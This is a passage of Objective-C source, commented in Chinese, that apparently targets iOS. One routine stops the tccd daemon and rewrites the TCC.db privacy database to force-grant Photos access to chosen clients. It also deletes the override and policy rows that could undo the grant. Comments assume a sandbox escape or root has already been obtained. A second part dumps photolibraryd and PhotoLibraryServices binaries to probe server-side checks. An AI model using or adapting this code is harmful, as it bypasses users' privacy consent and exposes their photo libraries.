        [log appendString:@"不可写：需要先做沙盒逃逸/root，或把 ProtectedSystem 的 TCC.db "
                          @"用 vnode redirect 指到可写副本"];
        return log;
    }

    // 先停 tccd：避免它持有 WAL 锁、并在我们写入后用自己的缓存覆盖
    [log appendFormat:@"%@\n", stopDaemonNamed("tccd")];
    usleep(300 * 1000);

    NSString *bak = [NSTemporaryDirectory() stringByAppendingPathComponent:@"TCC.db.bak"];
    NSFileManager *fm = [NSFileManager defaultManager];
    [fm removeItemAtPath:bak error:NULL];
    if ([fm copyItemAtPath:dbPath toPath:bak error:NULL]) {
        [log appendFormat:@"备份 -> %@\n", bak];
    } else {
        [log appendString:@"备份失败（继续，可逆性下降）\n"];
    }

    sqlite3 *db = NULL;
    int rc = p_sqlite3_open_v2(dbPath.fileSystemRepresentation, &db, kSQLiteOpenReadWrite, NULL);
    if (rc != kSQLiteOK || !db) {
        [log appendFormat:@"打开 DB 失败 rc=%d err=%@\n", rc, sqliteErr(db)];
        if (db) p_sqlite3_close(db);
        return log;
    }
    p_sqlite3_exec(db, "PRAGMA busy_timeout=3000;", NULL, NULL, NULL);

    NSArray<NSDictionary *> *cols = loadAccessColumns(db);
    if (cols.count == 0) {
        [log appendFormat:@"读取 access schema 失败: %@\n", sqliteErr(db)];
        p_sqlite3_close(db);
        return log;
    }

    NSArray<NSDictionary *> *clients = targetTCCClients();
    NSMutableArray<NSString *> *desc = [NSMutableArray array];
    for (NSDictionary *c in clients) {
        [desc addObject:[NSString stringWithFormat:@"%@@%d", c[@"client"], [c[@"type"] intValue]]];
    }
    [log appendFormat:@"clients=%@\n", [desc componentsJoinedByString:@", "]];

    NSArray<NSString *> *services = @[@"kTCCServicePhotos", @"kTCCServicePhotosAdd"];
    NSMutableString *sql = [NSMutableString stringWithString:@"BEGIN IMMEDIATE;"];
    for (NSString *svc in services) {
        for (NSDictionary *c in clients) {
            [sql appendFormat:@"DELETE FROM access WHERE service=%@ AND client=%@ AND client_type=%d;",
             sqlLiteral(svc), sqlLiteral(c[@"client"]), [c[@"type"] intValue]];
            [sql appendString:buildAccessInsert(cols, svc, c)];
        }
    }
    [sql appendString:@"COMMIT;"];

    NSString *err = execSQL(db, sql);
    if (err) {
        execSQL(db, @"ROLLBACK;");
        [log appendFormat:@"写入失败: %@\n备份可恢复: %@\n", err, bak];
    } else {
        [log appendFormat:@"已写入 %lu 条授权行（auth_value=2, csreq=NULL）\n",
                          (unsigned long)(clients.count * services.count)];
        // 清掉可能覆盖结果的策略表（存在才删，失败忽略）
        for (NSString *tbl in @[@"access_overrides", @"active_policy", @"expired"]) {
            if (!sqliteTableExists(db, tbl)) continue;
            for (NSString *svc in services) {
                for (NSDictionary *c in clients) {
                    execSQL(db, [NSString stringWithFormat:@"DELETE FROM %@ WHERE service=%@ AND client=%@;",
                                 tbl, sqlLiteral(svc), sqlLiteral(c[@"client"])]);
                }
            }
        }
        p_sqlite3_exec(db, "PRAGMA wal_checkpoint(TRUNCATE);", NULL, NULL, NULL);
    }
    p_sqlite3_close(db);

    usleep(200 * 1000);
    [log appendFormat:@"自检 %@\n", TCCServerCheckDetail()];
    return log;
}

// ============================================================================
// 服务端二进制取样：把 photolibraryd 一侧的代码整到沙盒里，供离线分析
// "服务端凭什么拒绝我们这个 client"。
// log2_57 已确定门在 photolibraryd 打开 CoreData store 那一步（客户端 swizzle
// 只能走到这里然后被 hang）。要判断它依据什么（TCC / entitlement / 容器租约），
// 至少要拿到 PhotoLibraryServices —— 客户端与 daemon 共用同一份 dylib，
// 服务端校验逻辑就在里面。
//   · dylib：本进程 dlopen 后直接从已映射镜像按 segment 写出（沙盒必然允许读，
//     因为 dlopen 已经成功），比从磁盘拷更可靠（系统分区上常只有 stub）
//   · photolibraryd：MH_EXECUTE，不能 dlopen，只能尝试磁盘复制；被 sandbox 拒
//     (errno=1) 或路径不存在 (errno=2) 都如实写日志
// 产物落 Documents/photodump/，Info.plist 已开 UIFileSharingEnabled，
// 可直接用「文件」App 或 Finder 拖出来。
// ============================================================================
static NSString *PHDumpDirectory(void) {
    static NSString *dir = nil;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        NSArray<NSString *> *paths =
            NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
        NSString *base = paths.firstObject ?: NSTemporaryDirectory();
        dir = [base stringByAppendingPathComponent:@"photodump"];
        [[NSFileManager defaultManager] createDirectoryAtPath:dir
                                 withIntermediateDirectories:YES
                                                  attributes:nil
                                                       error:NULL];
    });
    return dir;
}

static NSString *dumpLoadedImageForNeedle(NSString *needle, NSString *outName) {
    const char *cneedle = needle.UTF8String;
    uint32_t n = _dyld_image_count();
    for (uint32_t i = 0; i < n; i++) {
        const char *name = _dyld_get_image_name(i);
        if (!name || !strstr(name, cneedle)) continue;

        const struct mach_header_64 *hdr =
            (const struct mach_header_64 *)_dyld_get_image_header(i);
        intptr_t slide = _dyld_get_image_vmaddr_slide(i);
        if (!hdr || hdr->magic != MH_MAGIC_64) {
            return [NSString stringWithFormat:@"%@: 镜像头非法", outName];
        }

        uint64_t total = 0;
        const struct load_command *lc = (const struct load_command *)(hdr + 1);
        for (uint32_t c = 0; c < hdr->ncmds; c++) {
            if (lc->cmd == LC_SEGMENT_64) {
                const struct segment_command_64 *seg = (const struct segment_command_64 *)lc;
                if (seg->fileoff + seg->filesize > total) total = seg->fileoff + seg->filesize;
            }
            lc = (const struct load_command *)((const uint8_t *)lc + lc->cmdsize);
        }
        if (total < sizeof(struct mach_header_64) + hdr->sizeofcmds) {
            return [NSString stringWithFormat:@"%@: 段表为空", outName];
        }

        NSMutableData *out = [NSMutableData dataWithLength:(NSUInteger)total];
        if (!out) return [NSString stringWithFormat:@"%@: 分配 %llu 失败", outName, total];
        uint8_t *dst = out.mutableBytes;
        memcpy(dst, hdr, sizeof(struct mach_header_64) + hdr->sizeofcmds);

        int segs = 0;
        uint64_t copied = 0;
        lc = (const struct load_command *)(hdr + 1);
        for (uint32_t c = 0; c < hdr->ncmds; c++) {
            if (lc->cmd == LC_SEGMENT_64) {
                const struct segment_command_64 *seg = (const struct segment_command_64 *)lc;
                if (seg->filesize > 0 && seg->fileoff + seg->filesize <= total) {
                    const uint8_t *src = (const uint8_t *)(uintptr_t)(seg->vmaddr + slide);
                    memcpy(dst + seg->fileoff, src, (size_t)seg->filesize);
                    copied += seg->filesize;
                    segs++;
                }
            }
            lc = (const struct load_command *)((const uint8_t *)lc + lc->cmdsize);
        }

        NSString *outPath = [PHDumpDirectory() stringByAppendingPathComponent:outName];
        NSError *err = nil;
        if (![out writeToFile:outPath options:NSDataWritingAtomic error:&err]) {
            return [NSString stringWithFormat:@"%@: 写盘失败 %@", outName,
                    err.localizedDescription ?: @"unknown"];
        }
        return [NSString stringWithFormat:@"%@: OK %llu bytes segs=%d <- %s",
                outName, copied, segs, name];
    }
    return [NSString stringWithFormat:@"%@: 未在已加载镜像里找到 %@", outName, needle];
}

static NSString *copyFromDiskForDump(NSString *src, NSString *outName) {
    NSFileManager *fm = [NSFileManager defaultManager];
    if (![fm fileExistsAtPath:src]) {
        return [NSString stringWithFormat:@"%@: 磁盘无此路径（或不可见）%@", outName, src];
    }
    NSDictionary *attrs = [fm attributesOfItemAtPath:src error:NULL];
    NSString *outPath = [PHDumpDirectory() stringByAppendingPathComponent:outName];
    [fm removeItemAtPath:outPath error:NULL];
    NSError *err = nil;
    if (![fm copyItemAtPath:src toPath:outPath error:&err]) {
        int e = errno;
        return [NSString stringWithFormat:@"%@: 复制被拒 errno=%d (%@)", outName, e,
                err.localizedDescription ?: @"unknown"];
    }
    return [NSString stringWithFormat:@"%@: OK %lld bytes (disk copy)", outName,
            (long long)[attrs fileSize]];
}

NSString *PHDumpServiceBinaries(void) {
    static BOOL done = NO;
    if (done) return @"已 dump 过（本进程）";

    NSMutableString *log = [NSMutableString string];
    [log appendFormat:@"dir=%@\n", PHDumpDirectory()];

    // 1) photolibraryd 本体（MH_EXECUTE，只能走磁盘）
    [log appendFormat:@"%@\n", copyFromDiskForDump(@"/usr/libexec/photolibraryd",
                                                  @"photolibraryd.bin")];

    // 2) PhotoLibraryServices：客户端与 daemon 共用的 dylib，服务端 store 校验在这里
    void *pls = dlopen("/System/Library/PrivateFrameworks/PhotoLibraryServices.framework/PhotoLibraryServices",
                       RTLD_LAZY);
    if (!pls) [log appendFormat:@"dlopen PhotoLibraryServices 失败: %s\n", dlerror()];
    [log appendFormat:@"%@\n",
        dumpLoadedImageForNeedle(@"PhotoLibraryServices.framework", @"PhotoLibraryServices.bin")];

    // 3) PhotoLibraryServicesCore（PLPrivacy / TCC 相关实现常在这里）
    void *core = dlopen("/System/Library/PrivateFrameworks/PhotoLibraryServicesCore.framework/PhotoLibraryServicesCore",
                        RTLD_LAZY);
    if (!core) [log appendFormat:@"dlopen PhotoLibraryServicesCore 失败: %s\n", dlerror()];
    [log appendFormat:@"%@\n",
        dumpLoadedImageForNeedle(@"PhotoLibraryServicesCore.framework", @"PhotoLibraryServicesCore.bin")];

    done = YES;
    return log;
}
